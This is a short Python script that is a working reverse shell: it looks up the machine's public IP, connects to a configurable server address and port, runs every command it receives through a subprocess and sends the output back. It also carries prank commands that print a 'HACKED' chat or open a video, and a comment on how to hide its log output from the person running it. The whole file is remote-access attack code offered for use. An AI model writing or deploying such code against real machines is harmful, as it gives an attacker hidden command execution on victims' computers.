import socket
import time 
import pystyle
from pystyle import Colors, Write
import os 
import datetime
import subprocess
import requests 
from requests import get
SERVER_HOST = "127.0.0.1" # your server address
SERVER_PORT = 8080 #your server port

ip = get('https://api.ipify.org').text
#test2 = socket.gethostname()
#test = socket.gethostbyname(hostname)
now = datetime.datetime.now()
user = os.getlogin()
s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))
#conn, addr = s.accept() 
#s.send(local_ip.encode())

#print(f" {Colors.white}[{Colors.yellow}*{Colors.white}] Connecting...")
while True:
    command = s.recv(1024).decode() 
    #print(f" {Colors.white}[{Colors.green}+{Colors.white}] Connected with sucess")
    if command.lower() == "kill":
        break
    else:
        output = subprocess.getoutput(command)
        s.send(output.encode())

    if command.lower() == "hacked":
        print(f"{Colors.green}CHAT OPENED")
        time.sleep(0.5)
        print(f"{Colors.green}Hacker:")
        time.sleep(0.5)
        Write.Print("HACKED \n",Colors.white,interval=0.05)
    if command.lower() == "ipv4":
        s.send(ip.encode())

    if command.lower() == "rickroll":
        os.system("start https://youtu.be/xvFZjo5PgG0")

    #if command.lower() == "message":
    #    x = s.recv(1024).decode()
    #    print(x)



    print(f"{Colors.white}LOG:{Colors.green}",command) # if you want to hide the logs just delete this line

    
s.close()
